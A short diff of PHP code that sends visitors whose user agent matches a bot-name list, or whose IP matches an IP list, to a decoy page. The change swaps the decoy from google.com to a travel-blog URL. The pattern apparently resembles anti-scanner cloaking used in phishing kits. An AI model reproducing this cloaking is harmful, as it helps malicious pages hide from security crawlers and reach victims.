@@ -446,13 +446,13 @@ $Botname = array( // LIST BOOTS NAME
 
 foreach ($Botname as $word2) {
     if (stripos($_SERVER['HTTP_USER_AGENT'], $word2)) {
-        exit(header('Location: https://www.google.com/'));
+        exit(header('Location: https://annasherchand.com/backpacking-china/'));
     }
 }
 
 foreach ($ips as $ip) {
     if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
-        exit(header('Location: https://www.google.com/'));
+        exit(header('Location: https://annasherchand.com/backpacking-china/'));
     }
 }
 
